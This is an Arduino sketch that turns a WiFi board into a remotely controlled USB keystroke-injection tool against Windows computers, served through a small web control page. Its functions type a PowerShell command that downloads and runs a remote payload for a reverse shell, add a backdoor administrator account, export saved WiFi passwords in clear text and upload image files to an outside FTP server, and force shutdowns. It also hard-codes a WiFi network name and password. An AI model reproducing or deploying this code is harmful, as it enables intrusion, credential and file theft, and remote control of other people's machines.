#include <SPI.h>
#include <WiFiNINA.h>
#include <Keyboard.h>

char ssid[] = "Danny's iPhone"; 
char pass[] = "London12";
int keyIndex = 0;      
int ledpin = 6;
bool val = true;

int status = WL_IDLE_STATUS;
WiFiServer server(80);

void setup() {
  Serial.begin(9600);  
  Keyboard.begin();  
  Serial.print("Start Serial ");
  pinMode(ledpin, OUTPUT); 
  Serial.print("WiFi101 shield: ");
  if (WiFi.status() == WL_NO_SHIELD) {
    Serial.println("NOT PRESENT");
    return; // don't continue
  }
  Serial.println("DETECTED");
  
  while ( status != WL_CONNECTED) {
    digitalWrite(ledpin, LOW);
    Serial.print("Attempting to connect to Network named: ");
    Serial.println(ssid);                
    digitalWrite(ledpin, HIGH);
    status = WiFi.begin(ssid, pass);
    delay(10000);
  }
  server.begin();                          
  printWifiStatus();                      
  digitalWrite(ledpin, HIGH);
}
void loop() {
  WiFiClient client = server.available();  

  if (client) {                           
    Serial.println("new client");       
    String currentLine = "";              
    while (client.connected()) 
    {       
      if (client.available()) 
      {           
        char c = client.read();          
        Serial.write(c);                 
        if (c == '\n') 
        {                 

            if (currentLine.length() == 0) {
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println();
            client.print("<br>");
            client.print("<h1>Windows<br>");
            client.print("<br>");
            client.print("<h1>Click <a href=\"/WT\">here</a> To Test<br>");
            client.print("Click <a href=\"/L\">here</a> To Lock Computer<br>");
            client.print("Click <a href=\"/WL\">here</a> To Logout<br>");
            client.print("Click <a href=\"/WS\">here</a> To Shutdown<br>");
            client.print("Click <a href=\"/FTP\">here</a> To FTPSteal<br>");
            client.print("Click <a href=\"/CA\">here</a> To create an account<br>");
            client.print("Click <a href=\"/RS\">here</a> ReverseShellPayloadGrabber<br>");
            break;
          }
          else {   
            currentLine = "";
          }
        }
        else if (c != '\r') {   
          currentLine += c;   
        }


//Windows
        
        if (currentLine.endsWith("GET /WT")) {
          winTest();         
        }
        else if (currentLine.endsWith("GET /L")) {
          lockDevice();         
        }
        else if (currentLine.endsWith("GET /WL")) {
          winLogoff();         
        }
        else if (currentLine.endsWith("GET /WS")) {
          shutdownDevice();         
        }
        else if (currentLine.endsWith("GET /FTP")) {
          FTPSteal();         
        }
        else if (currentLine.endsWith("GET /CA")) {
          CreateAccount();         
        }
        else if (currentLine.endsWith("GET /RS")) {
          ReverseShellPayloadGrabber();         
        }
      }
    }

    client.stop();
    Serial.println("client disonnected");
  }
}

void printWifiStatus() 
{
  Serial.print("SSID: ");
  Serial.println(WiFi.SSID());
 
  IPAddress ip = WiFi.localIP();
  Serial.print("IP Address: ");
  Serial.println(ip);
 
  long rssi = WiFi.RSSI();
  Serial.print("signal strength (RSSI):");
  Serial.print(rssi);
  Serial.println(" dBm");
  // print where to go in a browser:
  Serial.print("To see this page in action, open a browser to http://");
  Serial.println(ip);
}

void ReverseShellPayloadGrabber() 
{
  //this hasnt been tested yet
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd");
  Keyboard.write(KEY_RETURN);
  delay(200);
  
  //upload the payload you want to use to this site and it will grab it from there
  Keyboard.println("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
  Keyboard.write(KEY_RETURN);
}

void CreateAccount()
{
  //this has not been tested
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd");
  Keyboard.write(KEY_RETURN);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  Keyboard.write(KEY_RETURN);
  delay(400);
  Keyboard.println("powershell");
  Keyboard.println("net user Mallard Mallard /add");
  Keyboard.println("net localgroup Administrators Mallard /add");
  Keyboard.write(KEY_RETURN);
  delay(500);
  /* end hide user section */
  Keyboard.println("exit");
  Keyboard.write(KEY_RETURN);
}

void FTPSteal()
{
  //not been tested
  // run cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd");
  Keyboard.write(KEY_RETURN);
  delay(400);

  //
  Keyboard.println("netsh wlan export profile key=clear");
  Keyboard.write(KEY_RETURN);
  delay(400);
  Keyboard.println("cd %USERPROFILE%");
  Keyboard.write(KEY_RETURN);
  delay(400);
  
  // type in ftp host address, username and password
  Keyboard.println("ftp -i YOUR_FTP_HOST_HERE");
  Keyboard.write(KEY_RETURN);
  delay(400);
  Keyboard.println("YOUR_FTP_USERNAME_HERE");
  Keyboard.write(KEY_RETURN);
  delay(400);
  Keyboard.println("YOUR_FTP_PASSWORD_HERE");
  Keyboard.write(KEY_RETURN);
  delay(400);

  //find all .jpg files and put them on the FTP server location
  Keyboard.println("MPUT *.jpg");
  Keyboard.write(KEY_RETURN);
  delay(800);

  //close cmd
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
}

void winTest()
{     Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);     
      delay(500);
      Keyboard.println("notepad");
      delay(2000);
      Keyboard.write(KEY_RETURN);
      delay(1000);
      Keyboard.println("HID Test For Windows");
}

void lockDevice()
{
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('l');
      Keyboard.releaseAll();
      delay(50);
}

void winLogoff()
{
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);     
      delay(500);
      Keyboard.println("shutdown -l");
      delay(50);
      Keyboard.write(KEY_RETURN);
      Keyboard.releaseAll();
      delay(1000);
}

void shutdownDevice()
{
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('r');
      Keyboard.releaseAll();
      Keyboard.write(KEY_RETURN);     
      delay(500);
      Keyboard.println("shutdown -t 0 -f -s");
      delay(50);
      Keyboard.write(KEY_RETURN);
      Keyboard.releaseAll();
      delay(1000);
}
